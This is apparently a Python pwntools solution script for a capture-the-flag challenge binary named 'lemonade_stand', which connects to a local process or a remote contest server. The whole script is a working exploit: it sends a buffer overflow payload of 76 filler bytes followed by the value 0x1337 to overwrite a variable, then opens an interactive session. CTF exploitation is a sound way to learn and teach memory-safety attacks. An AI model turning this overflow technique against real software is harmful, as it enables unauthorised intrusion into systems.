#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./lemonade_stand', checksec=False)

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it",13556)

    return r
    
def main():
    p = conn()
    OFFSET = 76
    target_value = p64(0x1337)

    payload = b'A'*OFFSET + target_value
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
